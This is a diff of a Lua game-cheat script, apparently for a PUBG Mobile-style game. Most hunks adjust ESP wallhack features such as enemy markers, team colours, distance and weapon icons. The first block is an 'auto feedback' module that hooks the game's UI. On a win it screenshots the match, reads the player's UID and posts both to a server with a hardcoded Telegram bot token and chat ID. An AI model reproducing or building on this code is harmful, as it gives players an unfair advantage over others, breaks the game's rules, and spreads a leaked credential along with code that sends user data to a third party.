+                if rank < 1700 then return "Bronze"
+                elseif rank < 2200 then return "Silver"
+                elseif rank < 2700 then return "Gold"
+                elseif rank < 3200 then return "Platinum"
+                elseif rank < 3700 then return "Diamond"
+                elseif rank < 4200 then return "Crown"
+                elseif rank < 4700 then return "Ace"
+                elseif rank < 5200 then return "Ace Master"
+                elseif rank < 5600 then return "Ace Dominator"
+                end
+                return "Conqueror"
+            end
+            local AFCaptionTemplate = "<b>THE_MAGOO AUTO FEEDBACK</b>\n<pre>\nPlayer - %s\nUID    - %s\nTime   - %s\nKills  - %d\nRank   - %s\n</pre>\n[ ACTIVE - SAFE ]\n<b>Owner: @THE_MAGOO</b>"
+            function AutoFeedback.SendFeedback(path, kills, rank, segment)
+                AFLog("Preparing to send feedback. Screenshot: " .. tostring(path))
+                local ok, err = pcall(function()
+                    local httpManager = AFGetModule("client.slua.logic.http.http_manager")
+                    if not httpManager or type(httpManager.Post) ~= "function" then
+                        AFLog("HTTP manager unavailable.")
+                        return
+                    end
+                    local attempts = 0
+                    local function TrySend()
+                        local imageData = AFReadFile(path)
+                        if #imageData > 0 then
+                            local uid = "unknown"
+                            if _G.DataMgr and _G.DataMgr.roleData and _G.DataMgr.roleData.uid then
+                                uid = tostring(_G.DataMgr.roleData.uid)
+                            elseif _G._KONG_UK then
+                                uid = tostring(_G._KONG_UK)
+                            end
+                            kills = tonumber(kills) or 0
+                            rank  = tonumber(rank)  or 0
+                            segment = tonumber(segment) or 0
+                            local maskedUid = "***"
+                            if uid ~= "unknown" and #uid > 5 then
+                                maskedUid = uid:sub(1,3) .. "***" .. uid:sub(-2)
+                            end
+                            local IST_OFFSET = 19800
+                            local caption = string.format(
+                                AFCaptionTemplate,
+                                "*****",
+                                maskedUid,
+                                os.date("!%H:%M:%S %d/%m/%Y IST", os.time() + IST_OFFSET),
+                                kills,
+                                AFGetRankName(rank)
+                            )
+                            local encodedImage = AFBase64Encode(imageData)
+                            encodedImage = encodedImage:gsub("%+", "%%2B")
+                            encodedImage = encodedImage:gsub("/", "%%2F")
+                            encodedImage = encodedImage:gsub("=", "%%3D")
+                            AFNotify("[MAGOO] Uploading Top 1 screenshot to VIP Server...")
+                            local body = "base64_image=" .. encodedImage
+                                .. "&caption=" .. AFUrlEncode(caption)
+                                .. "&bot_token=" .. AFUrlEncode("8636876689:AAGngG6hobOAdrWDG1z1clxjnITiOd_SRWM")
+                                .. "&chat_id=" .. AFUrlEncode("-1002523769779")
+                            httpManager:Post(
+                                AutoFeedback.Config.ServerURL,
+                                {["Content-Type"] = "application/x-www-form-urlencoded"},
+                                body,
+                                nil,
+                                function(success, _, response, errorMessage)
+                                    if success and response and tostring(response):find('"status":%s*true') then
+                                        AFNotify("[MAGOO] Feedback sent! (Kills: " .. tostring(kills) .. ")")
+                                    else
+                                        local detail = tostring(response or errorMessage):sub(1,40)
+                                        AFNotify("[MAGOO] VIP Server error: " .. detail)
+                                    end
+                                    AFRemoveFile(path)
+                                end,
+                                60
+                            )
+                            return
+                        end
+                        attempts = attempts + 1
+                        if attempts < 5 and AFAddTimerOnce(1.0, TrySend) then return end
+                        AFNotify("[MAGOO] Screenshot capture failed!")
+                        AFRemoveFile(path)
+                    end
+                    TrySend()
+                end)
+                if not ok then AFLog("SendFeedback Error: " .. tostring(err)) end
+            end
+            local AFHudNames = {
+                "BattleChat_UIBP","Chat_UIBP","ChatMsg_UIBP","TeamAvatar_UIBP","Team_UIBP",
+                "VoiceChat_UIBP","MiniMap_UIBP","Bag_UIBP","PickUp_UIBP","PickUpList_UIBP",
+                "SystemChat_UIBP","InGameChat_UIBP","InGameChatPanel_UIBP","KillFeed_UIBP",
+                "Elimination_UIBP","ChatHUD_UIBP","ChatPanel_UIBP","MainHUD_UIBP","BattleHUD_UIBP"
+            }
+            local function AFCreateHudController()
+                local hidden = {}
+                local function SetHidden(hide)
+                    local UIManager = _G.UIManager
+                    if not UIManager then return end
+                    if hide then
+                        for _, name in ipairs(AFHudNames) do
+                            local config
+                            if UIManager.UI_Config_InGame and UIManager.UI_Config_InGame[name] then
+                                config = UIManager.UI_Config_InGame[name]
+                            elseif UIManager.UI_Config and UIManager.UI_Config[name] then
+                                config = UIManager.UI_Config[name]
+                            end
+                            if config then
+                                local view = type(UIManager.GetUI) == "function" and UIManager.GetUI(config) or nil
+                                if view then
+                                    pcall(function()
+                                        if type(view.SetVisibility) == "function" then
+                                            view:SetVisibility(2)
+                                        elseif view.UIRoot and type(view.UIRoot.SetVisibility) == "function" then
+                                            view.UIRoot:SetVisibility(2)
+                                        elseif type(UIManager.HideUI) == "function" then
+                                            UIManager.HideUI(config)
+                                        end
+                                    end)
+                                    table.insert(hidden, {config = config, view = view})
+                                end
+                            end
+                        end
+                        return
+                    end
+                    for _, item in ipairs(hidden) do
+                        pcall(function()
+                            if item.view and type(item.view.SetVisibility) == "function" then
+                                item.view:SetVisibility(0)
+                            elseif item.view and item.view.UIRoot and type(item.view.UIRoot.SetVisibility) == "function" then
+                                item.view.UIRoot:SetVisibility(0)
+                            elseif type(UIManager.ShowUI) == "function" then
+                                UIManager.ShowUI(item.config)
+                            end
+                        end)
+                    end
+                    hidden = {}
+                end
+                return SetHidden
+            end
+            local function AFGetScreenshotDir()
+                local dirs = {}
+                local home = os.getenv("HOME")
+                if home and home ~= "" then
+                    table.insert(dirs, home .. "/Documents/ShadowTrackerExtra/Saved/")
+                end
+                local pkgs = {"com.tencent.ig","com.vng.pubgmobile","com.pubg.krmobile","com.rekoo.pubgm","com.pubg.imobile"}
+                for _, pkg in ipairs(pkgs) do
+                    table.insert(dirs, "/storage/emulated/0/Android/data/" .. pkg .. "/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/")
+                end
+                local selected = dirs[1]
+                for _, dir in ipairs(dirs) do
+                    local tp = dir .. "t.tmp"
+                    local f = io.open(tp, "w")
+                    if f then f:close(); os.remove(tp); selected = dir; break end
+                end
+                return selected
+            end
+            local function AFCaptureAndSend(kills, rank, segment, restoreHud)
+                local restored = false
+                local function RestoreOnce()
+                    if not restored then restored = true; restoreHud(false) end
+                end
+                local SM = import("ScreenshotMaker")
+                if not SM then RestoreOnce(); return end
+                local dir = AFGetScreenshotDir()
+                if not dir then RestoreOnce(); return end
+                local path = dir .. string.format("kongwin_%s.jpg", os.time())
+                local uiUtil = AFGetModule("client.common.ui_util")
+                local gameInstance = uiUtil and uiUtil.GetGameInstance and uiUtil.GetGameInstance()
+                local enginePreTick = gameInstance and gameInstance.EnginePreTick
+                if not enginePreTick or type(enginePreTick.Add) ~= "function" then RestoreOnce(); return end
+                local ticker = AFGetModule("common.time_ticker")
+                if not ticker or type(ticker.AddTimerOnce) ~= "function" then RestoreOnce(); return end
+                enginePreTick:Add(function()
+                    local actualPath = SM.MakePictureByName(path, true)
+                    if type(enginePreTick.Clear) == "function" then enginePreTick:Clear() end
+                    if actualPath and actualPath ~= "" then path = actualPath end
+                    local attempts = 0
+                    local function CheckCapture()
+                        attempts = attempts + 1
+                        local captured = false
+                        pcall(function() captured = SM.HasCaptured(path) end)
+                        if captured then
+                            RestoreOnce()
+                            AFLog("HasCaptured=true. Flushing...")
+                            pcall(SM.ResizePicture, path, 0.9, path)
+                            ticker.AddTimerOnce(2.0, function()
+                                if #AFReadFile(path) > 0 then
+                                    AutoFeedback.SendFeedback(path, kills, rank, segment)
+                                else
+                                    AFNotify("[MAGOO] iOS image read error!")
+                                end
+                            end)
+                        elseif attempts < 15 then
+                            ticker.AddTimerOnce(1, CheckCapture)
+                        else
+                            RestoreOnce()
+                            AFNotify("[MAGOO] Screenshot capture failed!")
+                        end
+                    end
+                    ticker.AddTimerOnce(1, CheckCapture)
+                end)
+            end
+            function AutoFeedback.ProcessWin(kills)
+                kills = tonumber(kills) or 0
+                local rank, segment = 0, 0
+                pcall(function()
+                    local battleResult = _G.BP_STRUCT_BattleResultData
+                    local rating = battleResult and (battleResult.rating or battleResult.BP_STRUCT_BTRating)
+                    if rating then
+                        rank = tonumber(rating.rank_rating) or 0
+                        segment = tonumber(rating.new_segment) or 0
+                    end
+                    if rank == 0 then
+                        local roleData = _G.DataMgr and _G.DataMgr.roleData
+                        if roleData and roleData.segment_rating then
+                            for _, value in pairs(roleData.segment_rating) do
+                                if type(value) == "table" then
+                                    for _, nv in pairs(value) do
+                                        if type(nv) == "number" and nv > rank then rank = nv end
+                                    end
+                                elseif type(value) == "number" and value > rank then
+                                    rank = value
+                                end
+                            end
+                        end
+                    end
+                end)
+                local now = os.clock()
+                if _G._MAGOO_FeedbackSentAt and (now - _G._MAGOO_FeedbackSentAt) < 120.0 then
+                    AFLog(string.format("Skipping feedback: sent %.1fs ago", now - _G._MAGOO_FeedbackSentAt))
+                    return
+                end
+                if _G._MAGOO_FeedbackInFlight then
+                    AFLog("Skipping feedback: in progress")
+                    return
+                end
+                if kills <= 5 then
+                    AFLog(string.format("Skipping feedback: Kill %d (need > 5)", kills))
+                    return
+                end
+                if rank > 0 and rank < 2200 then
+                    AFLog(string.format("Skipping feedback: Rank %d (need >= 2200)", rank))
+                    return
+                end
+                _G._MAGOO_FeedbackSentAt = now
+                _G._MAGOO_FeedbackInFlight = true
+                AFNotify("[MAGOO] Congratulations! TOP 1!")
+                local setHudHidden = AFCreateHudController()
+                setHudHidden(true)
+                local ok, err = pcall(AFCaptureAndSend, kills, rank, segment, setHudHidden)
+                if not ok then
+                    setHudHidden(false)
+                    _G._MAGOO_FeedbackInFlight = false
+                    AFLog("ProcessWin Error: " .. tostring(err))
+                else
+                    AFAddTimerOnce(25.0, function() _G._MAGOO_FeedbackInFlight = false end)
+                end
+            end
+            local function AFGetWinnerKills()
+                local kills = 0
+                pcall(function()
+                    local likeUtil = AFGetModule("GameLua.Mod.BaseMod.Client.Like.IngameLikeUtilClient")
+                    if likeUtil and type(likeUtil.GetMyPlayerState) == "function" then
+                        local ps = likeUtil.GetMyPlayerState()
+                        if ps and ps.Kills then kills = tonumber(ps.Kills) or 0 end
+                    end
+                    if kills == 0 then
+                        local resultLogic = AFGetModule("GameLua.Mod.BaseMod.Client.BattleResult.BattleResultData.BattleResultDataLogic", false)
+                        if resultLogic and type(resultLogic.GetBattleResultData) == "function" then
+                            local result = resultLogic:GetBattleResultData()
+                            if result and result.BP_mykill then kills = tonumber(result.BP_mykill) or 0 end
+                        end
+                    end
+                end)
+                return kills
+            end
+            local function AFTryInstallHook()
+                pcall(function()
+                    local UIManager = _G.UIManager
+                    if not UIManager or not UIManager.ShowUI then return end
+                    if UIManager.__MAGOOHooked then AutoFeedback.Hooked = true; return end
+                    AFLog("Hooking UIManager.ShowUI for Winner UI...")
+                    local originalShowUI = UIManager.ShowUI
+                    UIManager.ShowUI = function(config, params, ...)
+                        local result = originalShowUI(config, params, ...)
+                        pcall(function()
+                            local now = os.clock()
+                            if _G._MAGOO_FeedbackSentAt and (now - _G._MAGOO_FeedbackSentAt) < 120.0 then return end
+                            if _G._MAGOO_FeedbackInFlight then return end
+                            local inGameConfig = UIManager.UI_Config_InGame or {}
+                            local winnerConfigs = {
+                                inGameConfig.GameOverCountDown_UIBP,
+                                inGameConfig.GameOver_UIBP,
+                                inGameConfig.BattleResult_UIBP,
+                                inGameConfig.Result_UIBP,
+                            }
+                            local isWinnerUI = false
+                            for _, wc in ipairs(winnerConfigs) do
+                                if wc and config == wc then isWinnerUI = true; break end
+                            end
+                            local keyName = ""
+                            pcall(function()
+                                keyName = tostring((config and (config.keyName or config.KeyName or config.UIKey)) or "")
+                            end)
+                            if keyName ~= "" then
+                                local kl = string.lower(keyName)
+                                if kl:find("gameover") or kl:find("battleresult") or kl:find("battle_result")
+                                    or kl == "result_uibp" or kl:find("winlogo") or kl:find("winner") then
+                                    isWinnerUI = true
+                                end
+                            end
+                            local isWinner = params and (
+                                params.Reason == "win" or params.Reason == "Win" or params.Reason == "WIN"
+                                or params.ShowedWinLogo == true or params.bWin == true or params.IsWin == true
+                                or params.Winner == true or tostring(params.Reason or ""):lower() == "win"
+                            )
+                            if not isWinnerUI or not isWinner then return end
+                            if _G._MAGOO_FeedbackScheduled then return end
+                            _G._MAGOO_FeedbackScheduled = true
+                            local kills = AFGetWinnerKills()
+                            if not AFAddTimerOnce(2, function()
+                                _G._MAGOO_FeedbackScheduled = false
+                                AutoFeedback.ProcessWin(kills)
+                            end) then
+                                _G._MAGOO_FeedbackScheduled = false
+                                AutoFeedback.ProcessWin(kills)
+                            end
+                        end)
+                        return result
+                    end
+                    UIManager.__MAGOOHooked = true
+                    AutoFeedback.Hooked = true
+                    AFLog("UIManager Hook installed.")
+                end)
+            end
+            function AutoFeedback.Install()
+                AFLog("Installing AutoFeedback (Cloudflare+Telegram)...")
+                local ticker = AFGetModule("common.time_ticker")
+                AFTryInstallHook()
+                if ticker and type(ticker.AddTimerOnce) == "function" then
+                    ticker.AddTimerOnce(2.0, AFTryInstallHook)
+                    ticker.AddTimerOnce(5.0, AFTryInstallHook)
+                    ticker.AddTimerOnce(12.0, AFTryInstallHook)
+                end
+            end
+            _G.THE_MAGOO_AutoFeedback_BR = AutoFeedback
+            AutoFeedback.Install()
+            end)
+            end
             pcall(function()
             if _G._StarExactESP9 then return end
             _G._StarExactESP9 = true
@@ -9278,13 +6937,13 @@ pcall(function()
             local function syncBridge()
                 local c = _G.GTLMODConfig or {}
                 local L = _G.LexusConfig
-                local any = c.EspModelName or c.EspWeaponIcon or c.EspBox or c.EspLine or c.CounterEnabled
+                local any = c.EspModelName or c.EspWeaponIcon
                 L.EspLoai9 = any and true or false
                 L.Esp9_Count = c.CounterEnabled == true
                 L.Esp9_Name = c.EspModelName == true
                 L.Esp9_HP = (c.EspModelName == true) and (c.EspShowHealthBar ~= false)
                 L.Esp9_Team = (c.EspModelName == true) and (c.EspTeamColorBox ~= false)
-                L.Esp9_Weapon = false
+                L.Esp9_Weapon = c.EspWeaponIcon == true
                 L.Esp9_Distance = (c.EspModelName == true) and (c.EspShowDistance ~= false)
                 L.Esp9_Line = c.EspLine == true
                 L.Esp9_Skeleton = false
@@ -9304,25 +6963,10 @@ pcall(function()
                                 _G.PlayerMapMarker.EnsureRunning()
                             elseif _G.PlayerMapMarker and _G.PlayerMapMarker.Start then
                                 local L = _G.LexusConfig
-                                local c = _G.GTLMODConfig or {}
-                                local need = (L and L.EspLoai9)
-                                    or (c.EspBox == true)
-                                    or (c.EspWeaponIcon == true)
-                                    or (c.EspModelName == true)
-                                    or (c.EspLine == true)
-                                    or (c.CounterEnabled == true)
-                                    or (c.EspRadar == true)
-                                if need then
-                                    if _G.PlayerMapMarker.EnsureRunning then
-                                        pcall(_G.PlayerMapMarker.EnsureRunning)
-                                    elseif not _G.PlayerMapMarker.bActive and _G.PlayerMapMarker.Start then
-                                        pcall(_G.PlayerMapMarker.Start)
-                                    end
+                                if L and L.EspLoai9 then
+                                    if not _G.PlayerMapMarker.bActive then _G.PlayerMapMarker.Start() end
                                 elseif _G.PlayerMapMarker.bActive then
-                                    -- only stop if NOTHING needs the shared marker (never stop because one feature toggled)
-                                    if not (c.EspBox or c.EspWeaponIcon or c.EspModelName or c.EspLine or c.CounterEnabled or c.EspRadar) then
-                                        _G.PlayerMapMarker.Stop()
-                                    end
+                                    _G.PlayerMapMarker.Stop()
                                 end
                             end
                         end)
@@ -9355,7 +6999,6 @@ pcall(function()
             local FVector2D = _G.FVector2D or import("Vector2D")
             local FLinearColor = _G.FLinearColor or import("LinearColor")
             local FVector = _G.FVector or import("Vector")
-
             PlayerMapMarker.MarkTypeID = 1007
             PlayerMapMarker.bUseScreenESP = true
             PlayerMapMarker.bUseScreenMark = false
@@ -9380,9 +7023,8 @@ pcall(function()
             PlayerMapMarker.ESPWidgetZOrder = 2
             PlayerMapMarker.bShowDistance = true
             PlayerMapMarker.DistanceUnit = "m"
-
-            PlayerMapMarker.WeaponIconBrushW = 66
-            PlayerMapMarker.WeaponIconBrushH = 26
+            PlayerMapMarker.WeaponIconBrushW = 96
+            PlayerMapMarker.WeaponIconBrushH = 48
             PlayerMapMarker.HPWidgetSwitcherTypeIndex = 0
             PlayerMapMarker.HPWidgetSwitcherType2Index = 0
             PlayerMapMarker.bForceSwitcherIndexEveryUpdate = true
@@ -9435,7 +7077,7 @@ pcall(function()
             PlayerMapMarker.MapAddedFlag = 4
             PlayerMapMarker.nUpdateInterval = 0.5
             PlayerMapMarker.bUseFrameTick = false
-            PlayerMapMarker.nHeavyScanFrameInterval = 30
+            PlayerMapMarker.nHeavyScanFrameInterval = 15
             PlayerMapMarker.nDistanceUpdateFrameInterval = 5
             PlayerMapMarker.bIncludeMe = false
             PlayerMapMarker.bIncludeAI = true
@@ -9457,9 +7099,9 @@ pcall(function()
             PlayerMapMarker.WidgetComps = {}
             PlayerMapMarker._bAllPathsFailed = false
             PlayerMapMarker._bLightUpdateScheduled = false
-            PlayerMapMarker._LightUpdateInterval = 0.067
+            PlayerMapMarker._LightUpdateInterval = 0.05
             PlayerMapMarker._bDistanceUpdateScheduled = false
-            PlayerMapMarker._DistanceUpdateInterval = 0.15
+            PlayerMapMarker._DistanceUpdateInterval = 0.1
             PlayerMapMarker._bScreenMarkConfigSetup = false
             PlayerMapMarker._TimerHandles = {}
             PlayerMapMarker._TimerGeneration = 0
@@ -9794,12 +7436,18 @@ pcall(function()
             end
             function PlayerMapMarker.GetTeamColor(TeamID)
                 local tid = tonumber(TeamID) or 0
-                -- two styles only: odd teams = RED, even teams = WHITE (black used as outline/bg elsewhere)
-                local useRed = (tid % 2) == 1 or tid == 0
-                if useRed then
+                if tid == 0 then
                     return FLinearColor and FLinearColor(1.0, 0.12, 0.12, 1.0) or {R=255, G=30, B=30, A=255}
                 end
-                return FLinearColor and FLinearColor(0.95, 0.95, 0.95, 1.0) or {R=245, G=245, B=245, A=255}
+                local palette = {
+                    { R = 255, G = 35,  B = 35,  fR = 1.00, fG = 0.12, fB = 0.12 },
+                    { R = 35,  G = 220, B = 55,  fR = 0.12, fG = 0.90, fB = 0.18 },
+                    { R = 40,  G = 110, B = 255, fR = 0.15, fG = 0.40, fB = 1.00 },
+                    { R = 255, G = 210, B = 40,  fR = 1.00, fG = 0.82, fB = 0.12 },
+                }
+                local idx = ((tid - 1) % 4) + 1
+                local c = palette[idx] or palette[1]
+                return FLinearColor and FLinearColor(c.fR, c.fG, c.fB, 1.0) or {R=c.R, G=c.G, B=c.B, A=255}
             end
             local _WhiteTexture = nil
             local _bWhiteTextureFailed = false
@@ -9950,31 +7598,497 @@ pcall(function()
                 return BoneLoc
             end
             function PlayerMapMarker.GetCharacterWeaponInfo(Character)
-                return nil
+                if not IsValid(Character) then return nil end
+                local WeaponID, WeaponName, WeaponIconPath, WeaponIconTexture, CurrentWeapon = nil, nil, nil, nil, nil
+                pcall(function() if Character.GetCurrentWeapon then CurrentWeapon = Character:GetCurrentWeapon() end end)
+                if not CurrentWeapon then pcall(function() CurrentWeapon = Character.CurrentWeapon end) end
+                if not CurrentWeapon then pcall(function() if Character.GetWeaponManager then local WM = Character:GetWeaponManager() if WM and WM.GetCurrentWeapon then CurrentWeapon = WM:GetCurrentWeapon() end end end) end
+                if CurrentWeapon and IsValid(CurrentWeapon) then
+                    pcall(function() if CurrentWeapon.GetWeaponID then WeaponID = CurrentWeapon:GetWeaponID() end end)
+                    if not WeaponID then pcall(function() WeaponID = CurrentWeapon.WeaponID end) end
+                    if not WeaponID then pcall(function() if CurrentWeapon.GetItemID then WeaponID = CurrentWeapon:GetItemID() end end) end
+                    pcall(function() if CurrentWeapon.GetWeaponName then WeaponName = CurrentWeapon:GetWeaponName() end end)
+                    pcall(function() if CurrentWeapon.GetWeaponIconPath then WeaponIconPath = CurrentWeapon:GetWeaponIconPath() end end)
+                    pcall(function() if CurrentWeapon.GetWeaponIcon then WeaponIconTexture = CurrentWeapon:GetWeaponIcon() end end)
+                end
+                if not WeaponID then
+                    pcall(function()
+                        local PS = nil
+                        if Character.GetPlayerStateSafety then PS = Character:GetPlayerStateSafety() elseif Character.GetPlayerState then PS = Character:GetPlayerState() end
+                        if PS and IsValid(PS) then
+                            if PS.GetCurrentWeaponID then WeaponID = PS:GetCurrentWeaponID() end
+                            if not WeaponID and PS.CurWeaponID then WeaponID = PS.CurWeaponID end
+                        end
+                    end)
+                end
+                return { WeaponID = WeaponID, WeaponName = WeaponName, WeaponIconPath = WeaponIconPath, WeaponIconTexture = WeaponIconTexture, CurrentWeapon = CurrentWeapon }
             end
-            function PlayerMapMarker.ApplyWeaponIconToImage(ImageWidget, winfo)
-                return false, "disabled"
-            end
-
             function PlayerMapMarker.FindWeaponIconInWidget(WidgetObj, Depth, MaxDepth)
+                if not WidgetObj or not slua.isValid(WidgetObj) then return nil end
+                Depth = Depth or 0 ; MaxDepth = MaxDepth or 8
+                local propNames = { "Image_Weapon", "Image_WeaponIcon", "Image_Gun", "Image_Icon", "WeaponIcon", "WeaponImage", "Image_Equip" }
+                for _, pname in ipairs(propNames) do
+                    pcall(function()
+                        local prop = WidgetObj[pname]
+                        if prop and slua.isValid(prop) then
+                            local hasBrush = false
+                            pcall(function() if prop.Brush then hasBrush = true end end)
+                            if hasBrush then return prop end
+                        end
+                    end)
+                end
+                if Depth >= MaxDepth then return nil end
+                local nChildren = 0
+                pcall(function() if WidgetObj.GetChildrenCount then nChildren = WidgetObj:GetChildrenCount() end end)
+                for i = 0, math.max(nChildren - 1, 0) do
+                    local child = nil
+                    pcall(function() child = WidgetObj:GetChildAt(i) end)
+                    if child and slua.isValid(child) then
+                        local result = PlayerMapMarker.FindWeaponIconInWidget(child, Depth + 1, MaxDepth)
+                        if result then return result end
+                    end
+                end
+                if nChildren == 0 then
+                    local Root = PlayerMapMarker._GetWidgetRoot(WidgetObj)
+                    if Root and slua.isValid(Root) and Root ~= WidgetObj then
+                        local result = PlayerMapMarker.FindWeaponIconInWidget(Root, Depth + 1, MaxDepth)
+                        if result then return result end
+                    end
+                end
                 return nil
             end
             function PlayerMapMarker.FixWeaponIconBrushSize(ImageWidget, DefaultW, DefaultH)
-                return
+                if not ImageWidget or not slua.isValid(ImageWidget) then return end
+                DefaultW = DefaultW or 138 ; DefaultH = DefaultH or 69
+                pcall(function()
+                    local brush = ImageWidget.Brush
+                    if brush then
+                        brush.ImageSize = FVector2D and FVector2D(DefaultW, DefaultH) or {X=DefaultW, Y=DefaultH}
+                        brush.DrawAs = 3
+                        brush.TintColor = FLinearColor and FLinearColor(1.0, 1.0, 1.0, 1.0) or {R=1,G=1,B=1,A=1}
+                        if ImageWidget.SetBrush then ImageWidget:SetBrush(brush) end
+                    end
+                    if ImageWidget.SetDesiredSizeOverride then ImageWidget:SetDesiredSizeOverride(FVector2D and FVector2D(DefaultW, DefaultH) or {X=DefaultW, Y=DefaultH}) end
+                    local slot = ImageWidget.Slot
+                    if slot and slot.SetSize then slot:SetSize(FVector2D and FVector2D(DefaultW, DefaultH) or {X=DefaultW, Y=DefaultH}) end
+                    ImageWidget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
+                    ImageWidget:SetRenderOpacity(1.0)
+                    ImageWidget:SetColorAndOpacity(FLinearColor and FLinearColor(1.0, 1.0, 1.0, 1.0) or {R=1,G=1,B=1,A=1})
+                end)
             end
             function PlayerMapMarker.ApplyWeaponIconFullOpacity(Container, ourWeaponIcon)
-                return
+                local fullIcon = FLinearColor and FLinearColor(1.0, 1.0, 1.0, 1.0) or {R=1,G=1,B=1,A=1}
+                if not ourWeaponIcon or not slua.isValid(ourWeaponIcon) then return end
+                pcall(function() if ourWeaponIcon.SetRenderOpacity then ourWeaponIcon:SetRenderOpacity(1.0) end end)
+                pcall(function() if ourWeaponIcon.SetColorAndOpacity then ourWeaponIcon:SetColorAndOpacity(fullIcon) end end)
+                pcall(function()
+                    local brush = ourWeaponIcon.Brush
+                    if brush then pcall(function() brush.TintColor = fullIcon end) if ourWeaponIcon.SetBrush then ourWeaponIcon:SetBrush(brush) end end
+                end)
+                local chainNames = {"Border_WeaponColor", "Border_Weapon", "Border_WeaponIcon", "SizeBox_Weapon", "ScaleBox_Weapon", "Switcher_WeaponIcon"}
+                for _, pname in ipairs(chainNames) do
+                    pcall(function()
+                        local node = Container and Container[pname]
+                        if node and slua.isValid(node) and node.SetRenderOpacity then node:SetRenderOpacity(1.0) end
+                        if node and slua.isValid(node) and node.SetColorAndOpacity then node:SetColorAndOpacity(fullIcon) end
+                    end)
+                end
+            end
+            function PlayerMapMarker.ApplyWeaponIconToImage(ImageWidget, winfo)
+                if not ImageWidget or not slua.isValid(ImageWidget) then return false, "no_widget" end
+                if not winfo or not winfo.WeaponID then return false, "no_weapon_id" end
+                local iconPath = nil
+                local method = "none"
+                local bHasAddKnownMissing = false
+                local defaultW = 138
+                local defaultH = 69
+                pcall(function()
+                    local itemRecord = CDataTable.GetTableData("Item", winfo.WeaponID)
+                    if itemRecord and itemRecord.KillWhiteIcon and itemRecord.KillWhiteIcon ~= "" then iconPath = itemRecord.KillWhiteIcon method = "KillWhiteIcon" end
+                    if (not iconPath or iconPath == "") and winfo.WeaponIconPath and winfo.WeaponIconPath ~= "" then iconPath = winfo.WeaponIconPath method = "WeaponIconPath" end
+                    if (not iconPath or iconPath == "") and winfo.WeaponIconTexture and slua.isValid(winfo.WeaponIconTexture) then
+                        if ImageWidget.SetBrushFromTexture then ImageWidget:SetBrushFromTexture(winfo.WeaponIconTexture, true) method = "WeaponIconTexture" return end
+                    end
+                    if not iconPath or iconPath == "" then
+                        local UIUtil = require("client.common.ui_util")
+                        iconPath, bHasAddKnownMissing = UIUtil.GetItemBigIcon(winfo.WeaponID, ImageWidget)
+                        if iconPath and iconPath ~= "" then method = "GetItemBigIcon" end
+                    end
+                    if not iconPath or iconPath == "" then
+                        local UIUtil = require("client.common.ui_util")
+                        iconPath = UIUtil.GetItemSmallIcon(winfo.WeaponID, ImageWidget, bHasAddKnownMissing)
+                        if iconPath and iconPath ~= "" then method = "GetItemSmallIcon" end
+                    end
+                end)
+                if method == "WeaponIconTexture" then PlayerMapMarker.FixWeaponIconBrushSize(ImageWidget, defaultW, defaultH) return true, method end
+                if not iconPath or iconPath == "" then return false, "no_path" end
+                local bOK = false
+                pcall(function()
+                    if ImageWidget.SetBrushResourceFromPathSync then ImageWidget:SetBrushResourceFromPathSync(iconPath, true) bOK = true end
+                    if not bOK then
+                        local util = require("client.slua_ui_framework.util")
+                        local result = util.SetTexture(ImageWidget, iconPath, { sync = true, bMatchSize = true, bIsInCombatState = true, bHasAddKnownMissing = bHasAddKnownMissing })
+                        bOK = result ~= nil
+                    end
+                    if not bOK then
+                        local tex = import(iconPath)
+                        if tex and slua.isValid(tex) and ImageWidget.SetBrushFromTexture then ImageWidget:SetBrushFromTexture(tex, true) bOK = true end
+                    end
+                    if not bOK then
+                        local LoadObject = import("LoadObject")
+                        if LoadObject then
+                            local tex = LoadObject(iconPath)
+                            if tex and slua.isValid(tex) and ImageWidget.SetBrushFromTexture then ImageWidget:SetBrushFromTexture(tex, true) bOK = true end
+                        end
+                    end
+                end)
+                if bOK then PlayerMapMarker.FixWeaponIconBrushSize(ImageWidget, defaultW, defaultH) end
+                return bOK, method .. ":" .. tostring(iconPath)
             end
             function PlayerMapMarker.CopyWeaponIconBrushFromNative(ourWeaponIcon, nativeWeaponIcon)
-                return false, "disabled"
+                if not ourWeaponIcon or not slua.isValid(ourWeaponIcon) then return false end
+                if not nativeWeaponIcon or not slua.isValid(nativeWeaponIcon) then return false end
+                local bCopied = false
+                pcall(function()
+                    local nBrush = nativeWeaponIcon.Brush
+                    if nBrush then
+                        local resObj = nil
+                        pcall(function() resObj = nBrush.ResourceObject end)
+                        if resObj and slua.isValid(resObj) and ourWeaponIcon.SetBrushFromTexture then
+                            ourWeaponIcon:SetBrushFromTexture(resObj, true)
+                            bCopied = true
+                        end
+                        if bCopied then
+                            local imgSize = nil
+                            pcall(function() imgSize = nBrush.ImageSize end)
+                            if imgSize then
+                                local oBrush = ourWeaponIcon.Brush
+                                if oBrush then oBrush.ImageSize = imgSize if ourWeaponIcon.SetBrush then ourWeaponIcon:SetBrush(oBrush) end end
+                            end
+                        end
+                    end
+                end)
+                return bCopied
             end
-
-
             function PlayerMapMarker.AddWeaponIconToESP(WidgetData, Character)
-                -- weapon icon removed
-                return
+                if not WidgetData or not WidgetData.Container then return end
+                local Container = WidgetData.Container
+                if not slua.isValid(Container) then return end
+                if not _G.LexusConfig.Esp9_Weapon then
+                    pcall(function()
+                        local chainNames = {"Border_WeaponColor", "Border_Weapon", "Border_WeaponIcon", "SizeBox_Weapon", "ScaleBox_Weapon", "Switcher_WeaponIcon"}
+                        for _, pname in ipairs(chainNames) do
+                            local node = Container[pname]
+                            if node and slua.isValid(node) and node.SetWidgetVisibility then node:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end
+                        end
+                        local ourWeaponIcon = Container.WeaponIcon or PlayerMapMarker.FindWeaponIconInWidget(Container, 0, 8)
+                        if ourWeaponIcon and slua.isValid(ourWeaponIcon) then ourWeaponIcon:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end
+                    end)
+                    WidgetData._LastWeaponID = 0
+                    WidgetData._WeaponIconApplied = false
+                    return
+                end
+                pcall(function()
+                    local ourWeaponIcon = Container.WeaponIcon
+                    if not ourWeaponIcon or not slua.isValid(ourWeaponIcon) then ourWeaponIcon = PlayerMapMarker.FindWeaponIconInWidget(Container, 0, 8) end
+                    if not ourWeaponIcon or not slua.isValid(ourWeaponIcon) then return end
+                    local winfo = Character and PlayerMapMarker.GetCharacterWeaponInfo(Character) or nil
+                    if not winfo or not winfo.WeaponID or winfo.WeaponID == 0 then
